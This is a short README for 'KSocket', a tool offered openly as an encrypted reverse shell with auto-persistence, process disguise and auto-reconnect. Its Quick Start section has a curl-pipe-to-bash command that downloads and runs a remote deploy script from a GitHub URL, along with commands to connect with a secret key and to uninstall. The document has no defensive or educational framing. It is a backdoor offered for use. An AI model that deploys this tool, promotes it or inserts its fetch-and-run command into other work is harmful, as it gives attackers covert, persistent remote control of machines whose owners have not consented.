# KSocket

Encrypted reverse shell with auto-persistence. Single file deploy, secret-key based connection

## Features

- Single file deploy
- Secret key connection
- End-to-end encrypted (SRP-AES-256-CBC-SHA)
- Auto-persistence
- Process disguise
- Auto-reconnect
- Full interactive PTY
- Root & non-root support
- Zero dependency
- Lightweight (~1-2MB RAM, ~0% CPU)

## Quick Start

### Deploy

```bash
curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy | bash
```

### Connect

```bash
ks -s "SECRET" -i
```

### Uninstall

```bash
curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy | bash -s uninstall
```
